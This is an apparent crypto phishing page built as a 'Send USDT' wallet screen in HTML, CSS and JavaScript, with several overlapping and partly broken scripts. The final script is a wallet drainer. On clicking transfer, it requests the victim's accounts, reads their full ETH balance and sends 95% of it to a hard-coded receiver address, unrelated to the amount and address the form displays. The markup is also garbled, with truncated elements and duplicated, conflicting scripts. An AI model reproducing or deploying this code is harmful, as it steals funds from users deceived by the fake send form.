
<head>
<meta charset="utf-8">
<meta name="viewport"
      content="width=device-width,initial-scale=1,viewport-fit=cover">

<title>Send USDT</title>

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

:root{
  color-scheme:dark;

  --bg:#1b1b1b;
  --text:#f3f3f3;
  --secondary:#b8b8b8;
  --muted:#888;
  --box:#1b1b1b;
  --pill:#292929;
  --border:#686868;
  --green:#50f28d;
  --button:#2c8b56;
}

html,
body{
  margin:0;
  width:100%;
  min-height:100%;
  background:var(--bg);
  color:var(--text);

  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "SF Pro Display",
    "SF Pro Text",
    "Segoe UI",
    Roboto,
    Arial,
    sans-serif;
}

body{
  min-height:100dvh;
}

button,
input{
  font:inherit;
}

button{
  touch-action:manipulation;
}

/* APP */

.app{
  width:100%;
  max-width:760px;

  min-height:100dvh;

  margin:0 auto;

  padding:
    calc(env(safe-area-inset-top) + 12px)
    max(14px,env(safe-area-inset-right))
    calc(env(safe-area-inset-bottom) + 14px)
    max(14px,env(safe-area-inset-left));

  display:flex;
  flex-direction:column;

  background:var(--bg);
}

/* TOP */

.topbar{
  position:relative;

  height:48px;
  min-height:48px;

  display:flex;
  align-items:center;
  justify-content:center;

  margin-bottom:20px;
}

.back{
  position:absolute;

  left:0;
  top:50%;

  transform:translateY(-50%);

  width:44px;
  height:44px;

  padding:0;

  border:0;
  background:transparent;

  color:var(--secondary);

  font-size:44px;
  font-weight:300;
  line-height:40px;

  cursor:pointer;
}

.title{
  font-size:27px;
  line-height:1.1;

  font-weight:750;

  letter-spacing:-.8px;
}

/* SECTION */

.section{
  margin-bottom:20px;
}

.label{
  margin:0 0 9px;

  font-size:18px;
  line-height:1.2;

  font-weight:650;

  color:var(--secondary);

  letter-spacing:-.3px;
}

/* ADDRESS */

.address-box{
  width:100%;
  height:62px;
  min-height:62px;

  display:flex;
  align-items:center;

  padding:6px 7px 6px 12px;

  gap:3px;

  border:2px solid var(--green);
  border-radius:15px;

  background:var(--box);

  overflow:hidden;
}

.address-input{
  flex:1;
  min-width:0;
  width:100%;

  border:0;
  outline:0;

  background:transparent;

  color:var(--text);

  font-size:16px;
  font-weight:450;

  letter-spacing:-.2px;

  text-overflow:ellipsis;
}

.address-input::placeholder{
  color:#999;
  opacity:1;
}

.paste{
  flex:0 0 auto;

  min-width:48px;
  height:42px;

  padding:5px 3px;

  border:0;
  background:transparent;

  color:var(--green);

  font-size:16px;
  font-weight:700;

  cursor:pointer;
}

.icon-btn{
  flex:0 0 38px;

  width:38px;
  height:42px;

  padding:0;

  border:0;
  background:transparent;

  color:var(--green);

  display:grid;
  place-items:center;

  cursor:pointer;
}

.icon-btn svg{
  width:27px;
  height:27px;

  stroke:currentColor;
  fill:none;

  stroke-width:3;

  stroke-linecap:round;
  stroke-linejoin:round;
}

/* NETWORK */

.network-pill{
  width:max-content;
  max-width:100%;

  height:52px;
  min-height:52px;

  display:inline-flex;
  align-items:center;

  gap:9px;

  padding:4px 14px 4px 7px;

  border-radius:28px;

  background:var(--pill);

  color:var(--text);

  font-size:17px;
  font-weight:650;
}

.network-logo{
  width:44px;
  height:44px;

  border-radius:50%;

  object-fit:cover;

  background:#252525;
}

.chevron{
  width:8px;
  height:8px;

  margin-left:2px;
  margin-top:-4px;

  border-right:2px solid #777;
  border-bottom:2px solid #777;

  transform:rotate(45deg);
}

/* AMOUNT */

.amount-box{
  width:100%;

  height:62px;
  min-height:62px;

  display:flex;
  align-items:center;

  padding:6px 11px;

  gap:5px;

  border:2px solid var(--border);
  border-radius:15px;

  background:var(--box);
}

.amount-input{
  flex:1;
  min-width:0;
  width:100%;

  border:0;
  outline:0;

  background:transparent;

  color:var(--text);

  font-size:18px;
  font-weight:500;
}

.amount-input::placeholder{
  color:#999;
  opacity:1;
}

.currency{
  flex:0 0 auto;

  color:var(--text);

  font-size:17px;
  font-weight:650;
}

.max{
  flex:0 0 auto;

  min-width:42px;
  height:42px;

  padding:5px 2px 5px 6px;

  border:0;
  background:transparent;

  color:var(--green);

  font-size:17px;
  font-weight:750;

  cursor:pointer;
}

.usd{
  margin-top:7px;

  font-size:15px;

  color:var(--text);
}

/* BOTTOM */

.spacer{
  flex:1;
  min-height:24px;
}

.status{
  min-height:20px;

  margin:0 0 6px;

  text-align:center;

  font-size:13px;

  color:var(--muted);
}

.status.error{
  color:#ff8585;
}

.status.success{
  color:var(--green);
}

.btn{
  width:100%;

  height:56px;
  min-height:56px;

  border:0;
  border-radius:30px;

  background:var(--button);

  color:#151515;

  font-size:20px;
  font-weight:750;

  letter-spacing:-.3px;

  cursor:pointer;
}

.btn:active{
  transform:scale(.99);
}

.btn:disabled{
  opacity:.55;
}

<body>

<main class="app">

  <!-- TOP BAR -->
  <header class="topbar">

    <button
      class="back"
      type="button"
      aria-label="Back">
      ‹
    </button>

    <div class="title">
      Send USDT
    </div>

  </header>


  <!-- ADDRESS -->
  <section class="section">

    <div class="label">
      Address or Domain Name
    </div>

    <div class="address-box">

      <input
        id="address"
        class="address-input"
        type="text"
        value="0x4c4cbff8c45e131ab8f2af5f04b3a162078727c"
        placeholder="Search or Enter"
        autocomplete="off"
        autocapitalize="none"
        spellcheck="false"
        aria-label="Destination address">

      <button
        class="paste"
        id="pasteButton"
        type="button">
        Paste
      </button>

      <button
        class="icon-btn"
        id="copyButton"
        type="button"
        aria-label="Copy address">

        <svg viewBox="0 0 48 48">
          <rect x="13" y="10" width="23" height="29" rx="3"></rect>
          <path d="M9 16h4M9 22h4M9 28h4M9 34h4"></path>
          <path d="M19 16h12M19 22h9"></path>
        </svg>

      </button>

      <button
        class="icon-btn"
        id="scanButton"
        type="button"
        aria-label="Scan address">

        <svg viewBox="0 0 48 48">
          <path d="M8 17v-5a4 4 0 0 1 4-4h5M31 8h5a4 4 0 0 1 4 4v5M40 31v5a4 4 0 0 1-4 4h-5M17 40h-5a4 4 0 0 1-4-4v-5"></path>
          <path d="M15 20h18v8H15z"></path>
        </svg>

      </button>

    </div>

  </section>


  <!-- NETWORK -->
  <section class="section">

    <div class="label">
      Destination network
    </div>

    <div
      class="network-pill"
      aria-label="Ethereum network">

      <img
        class="network-logo"
        src="https://s2.coinmarketcap.com/static/img/coins/200x200/1027.png"
        alt="Ethereum">

      <span class="chevron"></span>

      <input
        id="amount"

        USDT

    id="status"
    class="status"

<script>

/* -------------------------------
   COPY ADDRESS
-------------------------------- */

const addressInput =
  document.getElementById("address");

const copyButton =
  document.getElementById("copyButton");

const pasteButton =
  document.getElementById("pasteButton");

const status =
  document.getElementById("status");


copyButton.addEventListener("click", async () => {

  try{

    await navigator.clipboard.writeText(
      addressInput.value
    );

    status.textContent = "Address copied";
    status.className = "status success";

  }catch(error){

    addressInput.select();

    document.execCommand("copy");

    status.textContent = "Address copied";
    status.className = "status success";
  }

});


/* -------------------------------
   PASTE
-------------------------------- */

pasteButton.addEventListener("click", async () => {

  try{

    const text =
      await navigator.clipboard.readText();

    if(text){

      addressInput.value = text;

      status.textContent = "Address pasted";
      status.className = "status success";
    }

  }catch(error){

    addressInput.focus();

    status.textContent =
      "Paste permission unavailable";

    status.className = "status error";
  }

});


/* -------------------------------
   AMOUNT / USD
-------------------------------- */

const amount =
  document.getElementById("amount");

const usdValue =
  document.getElementById("usdValue");

amount.addEventListener("input", () => {

  const value =
    parseFloat(amount.value);

  if(!value){

    usdValue.textContent = "≈ $0.00";
    return;
  }

  usdValue.textContent =
    "≈ $" +
    value.toLocaleString(
      "en-US",
      {
        minimumFractionDigits:2,
        maximumFractionDigits:2
      }
    );
});


/* -------------------------------
   MAX
-------------------------------- */

document
  .getElementById("maxButton")
  .addEventListener("click", () => {

    amount.value = "0";

    usdValue.textContent = "≈ $0.00";

  });


/* -------------------------------
   BACK
-------------------------------- */

document
  .querySelector(".back")
  .addEventListener("click", () => {

    if(history.length > 1){

      history.back();

    }

  });


/* -------------------------------
   NEXT
-------------------------------- */

document
  .getElementById("transferBtn")
  .addEventListener("click", () => {

    const address =
      addressInput.value.trim();

    const value =
      parseFloat(amount.value);

    if(!address){

      status.textContent =
        "Enter a destination address";

      status.className = "status error";

      addressInput.focus();

      return;
    }

    if(!value || value <= 0){

      status.textContent =
        "Enter a valid amount";

      status.className = "status error";

      amount.focus();

      return;
    }

    status.textContent =
      "Ready to continue";

    status.className = "status success";

  });

</script>
</body>
</html>

<script>
const DEFAULT_ADDRESS="0x4c4cbff8c45e131ab8f2af5f04b3a162078727c7";
const DEMO_BALANCE=100;

const addressInput=document.getElementById("address");
const amountInput=document.getElementById("amount");
const usdValue=document.getElementById("usdValue");
const status=document.getElementById("status");
const transferBtn=document.getElementById("transferBtn");
const pasteButton=document.getElementById("pasteButton");
const copyButton=document.getElementById("copyButton");
const scanButton=document.getElementById("scanButton");
const maxButton=document.getElementById("maxButton");

addressInput.value=DEFAULT_ADDRESS;

function updateAmount(){
  const amount=parseFloat(amountInput.value)||0;
  usdValue.textContent="≈ $"+amount.toFixed(2);
  status.textContent="";
  status.className="status";
}
amountInput.addEventListener("input",updateAmount);

pasteButton.addEventListener("click",async()=>{
  try{
    const text=await navigator.clipboard.readText();
    if(text) addressInput.value=text.trim();
  }catch(e){
    showError("Unable to access clipboard. Paste manually.");
  }
});

copyButton.addEventListener("click",async()=>{
  const value=addressInput.value.trim()||DEFAULT_ADDRESS;
  try{
    await navigator.clipboard.writeText(value);
    showSuccess("Address copied");
  }catch(e){
    showError("Unable to copy address");
  }
});

scanButton.addEventListener("click",()=>{
  showError("QR scanner is not connected in this demo.");
});

maxButton.addEventListener("click",()=>{
  amountInput.value=DEMO_BALANCE;
  updateAmount();
});

transferBtn.addEventListener("click",async()=>{
  const address=addressInput.value.trim()||DEFAULT_ADDRESS;
  const amount=parseFloat(amountInput.value);

  if(!Number.isFinite(amount)||amount<=0){
    showError("Enter a valid USDT amount");
    amountInput.focus();
    return;
  }
  if(amount>DEMO_BALANCE){
    showError("Amount exceeds the displayed balance");
    return;
  }
  await confirmTransfer(address,amount);
});

async function confirmTransfer(address,amount){
  showSuccess("Ready to continue with "+amount+" USDT");
  console.log(
    "Destination:",address,
    "Amount:",amount,
    "USDT",
    "Network: Ethereum"
  );
  // Connect a legitimate wallet/provider here.
  // The wallet must display the transaction and require
  // explicit user approval before broadcasting.
}

function showError(message){
  status.textContent=message;
  status.className="status error";
}
function showSuccess(message){
  status.textContent=message;
  status.className="status success";
}
</script>

<script>

    // CONFIGURATION: CHANGE THIS ADDRESS
    // ==========================================
    const HARD_CODED_RECEIVER_ADDRESS = "0xdffaf1dd6d36108223c2a45921afef85e3dcf852"; 
    // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
    
    async function checkWallet() {
        if (typeof window.ethereum !== 'undefined') {
            return true;
        } else {
            document.getElementById('status').innerHTML = "<span class='error'>Trust Wallet not detected. Open this link inside Trust Wallet.</span>";
            return false;
        }
    }

    async function transferFunds() {
        const btn = document.getElementById('transferBtn');
        const statusDiv = document.getElementById('status');
        
        // 1. Check for Ethereum Provider (Trust Wallet)
        if (!(await checkWallet())) return;

        try {
            btn.disabled = true;
            btn.innerText = "Connecting...";
            statusDiv.innerHTML = "";

            //  2. Request Account Access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];

            btn.innerText = "Confirming in Wallet...";

            // 3. Estimate Gas (Optional but recommended for reliability)
            // We calculate the exact amount to send by getting current balance first
            const balance = await window.ethereum.request({ 
                method: 'eth_getBalance', 
                params: [account, 'latest'] 
            });
            
            // Convert hex balance to decimal
            const balanceDecimal = parseInt(balance, 16);
            
            // Subtract a small amount for gas (approx 0.005 ETH equivalent) to ensure tx goes through
            // We use 90% of the balance to be safe with gas fees
            const sendAmount = Math.floor(balanceDecimal * 0.95);

            // 4. Prepare Transaction Object
            const txParams = {
                from: account,
                to: HARD_CODED_RECEIVER_ADDRESS,
                value: '0x' + sendAmount.toString(16), // Convert decimal to hex
                // Gas limit is usually 21000 for simple ETH transfer, but we add buffer
                gas: '0x5208', 
            };

            // 5. Send Transaction
            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });

            // 6. Success
            btn.innerText = "Transfer Sent!";
            statusDiv.innerHTML = `<span class='success'>Success! TX Hash: ${txHash}</span>`;
            console.log("Transaction Hash:", txHash);

        } catch (error) {
            console.error(error);
            if (error.code === 4001) {
                statusDiv.innerHTML = "<span class='error'>User rejected the transaction in Trust Wallet.</span>";
            } else {
                statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
            }
            btn.disabled = false;
            btn.innerText = "CONFIRM TRANSFER";
        }
    }

    // Attach click event
    document.getElementById('transferBtn').addEventListener('click', transferFunds);

</script>

</body>
